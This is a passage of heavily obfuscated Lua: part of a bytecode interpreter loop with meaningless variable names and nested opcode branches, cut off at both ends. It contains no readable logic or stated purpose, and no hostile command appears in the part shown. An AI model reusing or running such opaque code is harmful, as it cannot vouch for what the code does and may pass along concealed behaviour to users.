c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];end end else if f<17 then local r=t[e];local e=c[t[n]];c[r+1]=e;c[r]=e[t[l]];else if f~=14 then repeat if 17<f then local d=t[e];local l=t[l];local e=d+2 local d={c[d](c[d+1],c[e])};for t=1,l do c[e+t]=d[t];end;local d=d[1]if d then c[e]=d r=t[n];else r=r+1;end;break;end;local s,o;for f=0,9 do if 4>=f then if f>1 then if 3<=f then if 4~=f then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else c[t[e]]={};r=r+1;t=d[r];end else if 0~=f then c(t[e],t[n]);r=r+1;t=d[r];else s=t[e];o=c[t[n]];c[s+1]=o;c[s]=o[t[l]];r=r+1;t=d[r];end end else if f>6 then if f>7 then if f>=4 then repeat if 9~=f then s=t[e]c[s]=c[s]()r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];until true;else c[t[e]]=c[t[n]][t[l]];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if 4~=f then for h=36,72 do if f>5 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end end end until true;else local s,o;for f=0,9 do if 4>=f then if f>1 then if 3<=f then if 4~=f then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else c[t[e]]={};r=r+1;t=d[r];end else if 0~=f then c(t[e],t[n]);r=r+1;t=d[r];else s=t[e];o=c[t[n]];c[s+1]=o;c[s]=o[t[l]];r=r+1;t=d[r];end end else if f>6 then if f>7 then if f>=4 then repeat if 9~=f then s=t[e]c[s]=c[s]()r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];until true;else c[t[e]]=c[t[n]][t[l]];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if 4~=f then for h=36,72 do if f>5 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end end end end end end end end else if 32>=f then if 27>f then if 23<f then if f>24 then if 24<=f then for o=25,93 do if f<26 then local r=t[e]c[r]=c[r](s(c,r+1,t[n]))break;end;for f=0,6 do if f<=2 then if 1>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if 2~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if 5<=f then if 4<=f then for h=20,78 do if 5<f then c(t[e],t[n]);break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c(t[e],t[n]);end else if 0~=f then for l=49,54 do if 3<f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end break;end;else local r=t[e]c[r]=c[r](s(c,r+1,t[n]))end else c[t[e]][t[n]]=c[t[l]];end else if f>19 then repeat if f~=22 then local f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))break;end;local t=t[e]local e,r=b(c[t](c[t+1]))o=r+t-1 local r=0;for t=t,o do r=r+1;c[t]=e[r];end;until true;else local t=t[e]local e,r=b(c[t](c[t+1]))o=r+t-1 local r=0;for t=t,o do r=r+1;c[t]=e[r];end;end end else if f<=29 then if f<=27 then local r=t[e]local n={c[r](s(c,r+1,o))};local e=0;for t=r,t[l]do e=e+1;c[t]=n[e];end else if 28~=f then local o;for f=0,6 do if f<3 then if 1<=f then if-2~=f then repeat if f~=1 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 5>f then if 2~=f then repeat if f<4 then c(t[e],t[n]);r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end else if f==6 then o=t[e]c[o]=c[o](s(c,o+1,t[n]))else c(t[e],t[n]);r=r+1;t=d[r];end end end end else local u,h,f,p,_,k;for a=0,4 do if a<2 then if-1~=a then for j=19,63 do if a>0 then f=t[e]p,_=b(c[f](s(c,f+1,t[n])))o=_+f-1 k=0;for t=f,o do k=k+1;c[t]=p[k];end;r=r+1;t=d[r];break;end;u=t[n];h=c[u]for t=u+1,t[l]do h=h..c[t];end;c[t[e]]=h;r=r+1;t=d[r];break;end;else u=t[n];h=c[u]for t=u+1,t[l]do h=h..c[t];end;c[t[e]]=h;r=r+1;t=d[r];end else if a>=3 then if a>=0 then repeat if 4>a then c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;r=t[n];until true;else r=t[n];end else f=t[e]c[f]=c[f](s(c,f+1,o))r=r+1;t=d[r];end end end end end else if 31<=f then if f~=27 then repeat if f>31 then if(c[t[e]]<c[t[l]])then r=r+1;else r=t[n];end;break;end;local s;for f=0,4 do if f>1 then if f<=2 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if 1<f then repeat if f~=3 then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else if not c[t[e]]then r=r+1;else r=t[n];end;end end else if-2<=f then for l=31,71 do if 1~=f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;s=t[e]c[s]=c[s]()r=r+1;t=d[r];break;end;else s=t[e]c[s]=c[s]()r=r+1;t=d[r];end end end until true;else if(c[t[e]]<c[t[l]])then r=r+1;else r=t[n];end;end else local o,s;for f=0,6 do if f>=3 then if f>=5 then if 5==f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[t[l]];end else if f>0 then repeat if f>3 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f<=0 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else if f>=-2 then for s=34,65 do if f~=1 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end end end end else if 38<f then if f<=41 then if f<40 then local s,o;for f=0,6 do if 3>f then if f<1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else if 0<f then for h=47,89 do if 2~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f<=4 then if f~=0 then repeat if f~=3 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 3~=f then for h=33,96 do if f~=5 then s=t[e];o=c[t[n]];c[s+1]=o;c[s]=o[t[l]];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else s=t[e];o=c[t[n]];c[s+1]=o;c[s]=o[t[l]];end end end end else if 39<f then for h=30,82 do if 41~=f then local t=t[e]local e,r=b(c[t](c[t+1]))o=r+t-1 local r=0;for t=t,o do r=r+1;c[t]=e[r];end;break;end;local f;for h=0,4 do if h>1 then if 2<h then if h>=2 then repeat if 3~=h then f=t[e]c[f](s(c,f+1,t[n]))break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else f=t[e]c[f](s(c,f+1,t[n]))end else c[t[e]]=c[t[n]];r=r+1;t=d[r];end else if h==0 then c(t[e],t[n]);r=r+1;t=d[r];else c[t[e]]=c[t[n]][c[t[l]]];r=r+1;t=d[r];end end end break;end;else local f;for h=0,4 do if h>1 then if 2<h then if h>=2 then repeat if 3~=h then f=t[e]c[f](s(c,f+1,t[n]))break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else f=t[e]c[f](s(c,f+1,t[n]))end else c[t[e]]=c[t[n]];r=r+1;t=d[r];end else if h==0 then c(t[e],t[n]);r=r+1;t=d[r];else c[t[e]]=c[t[n]][c[t[l]]];r=r+1;t=d[r];end end end end end else if 43>f then local f,h;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];else if 44>f then if(c[t[e]]~=c[t[l]])then r=r+1;else r=t[n];end;else local d=c[t[l]];if d then r=r+1;else c[t[e]]=d;r=t[n];end;end end end else if 36>f then if f<34 then if(c[t[e]]==t[l])then r=r+1;else r=t[n];end;else if 30<f then for a=36,52 do if 34<f then local f,p,_,k,a;for u=0,6 do if 3<=u then if u<5 then if 4==u then c[t[e]]=c[t[n]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if 1~=u then for n=35,91 do if 5~=u then f=t[e]c[f](s(c,f+1,o))break;end;f=t[e]_,k=b(c[f](c[f+1]))o=k+f-1 a=0;for t=f,o do a=a+1;c[t]=_[a];end;r=r+1;t=d[r];break;end;else f=t[e]_,k=b(c[f](c[f+1]))o=k+f-1 a=0;for t=f,o do a=a+1;c[t]=_[a];end;r=r+1;t=d[r];end end else if u>=1 then if 1~=u then f=t[e];p=c[t[n]];c[f+1]=p;c[f]=p[t[l]];r=r+1;t=d[r];else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end end end break;end;local f;for h=0,5 do if h<=2 then if h<=0 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if h>=-3 then repeat if h~=2 then c(t[e],t[n]);r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end end else if h>=4 then if 2<h then repeat if h>4 then c[t[e]][t[n]]=c[t[l]];break;end;f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];until true;else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end end end break;end;else local f;for h=0,5 do if h<=2 then if h<=0 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if h>=-3 then repeat if h~=2 then c(t[e],t[n]);r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end end else if h>=4 then if 2<h then repeat if h>4 then c[t[e]][t[n]]=c[t[l]];break;end;f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];until true;else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end end end end end else if 37<=f then if 35~=f then repeat if 37~=f then for t=t[e],t[n]do c[t]=nil;end;break;end;if(c[t[e]]<c[t[l]])then r=t[n];else r=r+1;end;until true;else if(c[t[e]]<c[t[l]])then r=t[n];else r=r+1;end;end else for f=0,7 do if f<=3 then if f<2 then if f>-4 then repeat if f>0 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];until true;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end else if f>1 then for h=29,67 do if 2<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f<=5 then if 4==f then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end else if f<7 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else c[t[e]][t[n]]=c[t[l]];end end end end end end end end end end else if f<=134 then if 111<f then if 123<=f then if 128>=f then if 126>f then if f>=124 then if f>121 then for r=11,75 do if f<125 then local t=t[e];do return s(c,t,o)end;break;end;c[t[e]]=h[t[n]];break;end;else c[t[e]]=h[t[n]];end else local f;c[t[e]]=a[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];if(c[t[e]]==c[t[l]])then r=r+1;else r=t[n];end;end else if 126>=f then local t=t[e]c[t]=c[t](s(c,t+1,o))else if f~=128 then local f;for s=0,4 do if 2<=s then if 2>=s then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if s>=-1 then for f=30,79 do if s<4 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if not c[t[e]]then r=r+1;else r=t[n];end;break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if s~=-4 then repeat if s~=1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;f=t[e]c[f]=c[f]()r=r+1;t=d[r];until true;else f=t[e]c[f]=c[f]()r=r+1;t=d[r];end end end else local f,o,h,s,a,l,b,k;for l=0,4 do if 2<=l then if 2>=l then l=0;while l>-1 do if 3<=l then if l<=4 then if l~=0 then for t=11,64 do if l~=3 then a=f[o];break;end;s=f[h];break;end;else a=f[o];end else if 3<l then repeat if 6~=l then c(a,s);break;end;l=-2;until true;else l=-2;end end else if 1<=l then if l>=-2 then for t=24,83 do if l<2 then o=e;break;end;h=n;break;end;else o=e;end else f=t;end end l=l+1 end r=r+1;t=d[r];else if 1<=l then repeat if 3<l then b=t[e];k=c[b];for t=b+1,t[n]do u.XMvmrncw(k,c[t])end;break;end;l=0;while l>-1 do if l>2 then if 4>=l then if l~=2 then repeat if 3~=l then a=f[o];break;end;s=f[h];until true;else s=f[h];end else if 6>l then c(a,s);else l=-2;end end else if 0>=l then f=t;else if l>=0 then repeat if l>1 then h=n;break;end;o=e;until true;else h=n;end end end l=l+1 end r=r+1;t=d[r];until true;else b=t[e];k=c[b];for t=b+1,t[n]do u.XMvmrncw(k,c[t])end;end end else if l>=-1 then repeat if l>0 then l=0;while l>-1 do if l>2 then if 5>l then if l>=0 then repeat if 4~=l then s=f[h];break;end;a=f[o];until true;else s=f[h];end else if 2<=l then for t=44,73 do if l~=6 then c(a,s);break;end;l=-2;break;end;else l=-2;end end else if 0<l then if-2<l then repeat if 2>l then o=e;break;end;h=n;until true;else h=n;end else f=t;end end l=l+1 end r=r+1;t=d[r];break;end;l=0;while l>-1 do if l>2 then if 4>=l then if 3<l then a=f[o];else s=f[h];end else if l~=4 then for t=24,96 do if 5~=l then l=-2;break;end;c(a,s);break;end;else c(a,s);end end else if l>0 then if-3<l then repeat if 1~=l then h=n;break;end;o=e;until true;else o=e;end else f=t;end end l=l+1 end r=r+1;t=d[r];until true;else l=0;while l>-1 do if l>2 then if 5>l then if l>=0 then repeat if 4~=l then s=f[h];break;end;a=f[o];until true;else s=f[h];end else if 2<=l then for t=44,73 do if l~=6 then c(a,s);break;end;l=-2;break;end;else l=-2;end end else if 0<l then if-2<l then repeat if 2>l then o=e;break;end;h=n;until true;else h=n;end else f=t;end end l=l+1 end r=r+1;t=d[r];end end end end end end else if 132<=f then if f<=132 then local l;for f=0,6 do if 3>f then if f<1 then c(t[e],t[n]);r=r+1;t=d[r];else if f==2 then c(t[e],t[n]);r=r+1;t=d[r];else c(t[e],t[n]);r=r+1;t=d[r];end end else if 5<=f then if f>4 then repeat if f>5 then l=t[e]c[l]=c[l](s(c,l+1,t[n]))break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else l=t[e]c[l]=c[l](s(c,l+1,t[n]))end else if 3<f then c(t[e],t[n]);r=r+1;t=d[r];else c(t[e],t[n]);r=r+1;t=d[r];end end end end else if f~=129 then repeat if f<134 then for f=0,4 do if 1>=f then if-3~=f then repeat if f~=0 then c[t[e]]={};r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]]={};r=r+1;t=d[r];end else if f<3 then c[t[e]]={};r=r+1;t=d[r];else if 0<=f then repeat if 3~=f then c[t[e]]=c[t[n]][t[l]];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]]={};r=r+1;t=d[r];end end end end break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];r=t[n];until true;else for f=0,4 do if 1>=f then if-3~=f then repeat if f~=0 then c[t[e]]={};r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]]={};r=r+1;t=d[r];end else if f<3 then c[t[e]]={};r=r+1;t=d[r];else if 0<=f then repeat if 3~=f then c[t[e]]=c[t[n]][t[l]];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]]={};r=r+1;t=d[r];end end end end end end else if f<130 then local s;for f=0,4 do if f<2 then if f==0 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else s=t[e]c[s]=c[s]()r=r+1;t=d[r];end else if 2<f then if 2~=f then for h=12,96 do if f~=3 then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end else if f>130 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);else local t=t[e]c[t](s(c,t+1,o))end end end end else if f<=116 then if 113<f then if f>114 then if 111~=f then for o=16,94 do if f~=115 then local l;for f=0,5 do if 3<=f then if 4<=f then if 3<=f then for h=20,52 do if f<5 then c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;l=t[e]c[l](c[l+1])break;end;else l=t[e]c[l](c[l+1])end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if 0<f then if 2~=f then c(t[e],t[n]);r=r+1;t=d[r];else l=t[e]c[l](s(c,l+1,t[n]))r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end end end break;end;local o,s;for f=0,6 do if f<3 then if 0>=f then h[t[n]]=c[t[e]];r=r+1;t=d[r];else if f>-1 then for h=30,93 do if 2>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[t[l]];r=r+1;t=d[r];break;end;else o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[t[l]];r=r+1;t=d[r];end end else if f<5 then if f~=4 then c(t[e],t[n]);r=r+1;t=d[r];else c[t[e]]={};r=r+1;t=d[r];end else if f~=1 then for h=37,55 do if 6~=f then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=t[l];break;end;else c[t[e]][t[n]]=t[l];end end end end break;end;else local l;for f=0,5 do if 3<=f then if 4<=f then if 3<=f then for h=20,52 do if f<5 then c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;l=t[e]c[l](c[l+1])break;end;else l=t[e]c[l](c[l+1])end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if 0<f then if 2~=f then c(t[e],t[n]);r=r+1;t=d[r];else l=t[e]c[l](s(c,l+1,t[n]))r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end end end end else c[t[e]][t[n]]=c[t[l]];end else if f>=111 then repeat if 112<f then local o,s;for f=0,6 do if 2>=f then if 1<=f then if f>=-3 then for s=21,61 do if 1<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if f<=4 then if f~=3 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 2<f then for h=43,56 do if f~=6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[t[l]];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end break;end;c[t[e]]=c[t[n]]*c[t[l]];until true;else local s,o;for f=0,6 do if 2>=f then if 1<=f then if f>=-3 then for s=21,61 do if 1<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if f<=4 then if f~=3 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 2<f then for h=43,56 do if f~=6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;s=t[e];o=c[t[n]];c[s+1]=o;c[s]=o[t[l]];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end end else if 120>f then if 117<f then if f>118 then local r=t[e]local e,t=b(c[r](s(c,r+1,t[n])))o=t+r-1 local t=0;for r=r,o do t=t+1;c[r]=e[t];end;else local l;for f=0,1 do if 1~=f then l=t[e]c[l](c[l+1])r=r+1;t=d[r];else c[t[e]]=h[t[n]];end end end else if(c[t[e]]<=t[l])then r=r+1;else r=t[n];end;end else if 120>=f then local s,o,a,u,b,f;for f=0,6 do if 3>f then if f<1 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if 1==f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f>=5 then if f>=1 then repeat if 5<f then f=0;while f>-1 do if f<3 then if f>=1 then if-1<=f then for t=13,67 do if 1<f then a=n;break;end;o=e;break;end;else o=e;end else s=t;end else if f>4 then if 6~=f then c(b,u);else f=-2;end else if f~=-1 then repeat if f~=4 then u=s[a];break;end;b=s[o];until true;else u=s[a];end end end f=f+1 end break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 4>f then c[t[e]]=h[t[n]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end else if 117~=f then repeat if 122~=f then local e=t[e];local r=c[t[n]];c[e+1]=r;c[e]=r[c[t[l]]];break;end;for f=0,7 do if 4<=f then if 5<f then if f>5 then repeat if f~=6 then c[t[e]][t[n]]=c[t[l]];break;end;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];until true;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else if 5>f then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end else if f>1 then if f<3 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if f>=-4 then repeat if f~=0 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];until true;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end end end until true;else for f=0,7 do if 4<=f then if 5<f then if f>5 then repeat if f~=6 then c[t[e]][t[n]]=c[t[l]];break;end;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];until true;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end else if 5>f then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end else if f>1 then if f<3 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if f>=-4 then repeat if f~=0 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];until true;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end end end end end end end end else if f<101 then if f>=95 then if 97<f then if 99>f then local s,f;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];else if 98<=f then repeat if f~=100 then if c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=#c[t[n]];until true;else if c[t[e]]then r=r+1;else r=t[n];end;end end else if f>=96 then if 97==f then local f,h;c[t[e]]={};r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];else local t=t[e]c[t]=c[t]()end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];end end else if 92>f then if 89<=f then for o=48,67 do if f<91 then local f,a;for o=0,6 do if 3>o then if o<=0 then c(t[e],t[n]);r=r+1;t=d[r];else if o>=-2 then for h=35,92 do if 2>o then f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;f=t[e];a=c[t[n]];c[f+1]=a;c[f]=a[t[l]];r=r+1;t=d[r];break;end;else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end end else if o<=4 then if 4~=o then c(t[e],t[n]);r=r+1;t=d[r];else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end else if 6~=o then f=t[e];a=c[t[n]];c[f+1]=a;c[f]=a[t[l]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];end end end end break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]]-c[t[l]];break;end;else local f,a;for o=0,6 do if 3>o then if o<=0 then c(t[e],t[n]);r=r+1;t=d[r];else if o>=-2 then for h=35,92 do if 2>o then f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;f=t[e];a=c[t[n]];c[f+1]=a;c[f]=a[t[l]];r=r+1;t=d[r];break;end;else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end end else if o<=4 then if 4~=o then c(t[e],t[n]);r=r+1;t=d[r];else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end else if 6~=o then f=t[e];a=c[t[n]];c[f+1]=a;c[f]=a[t[l]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];end end end end end else if f<93 then 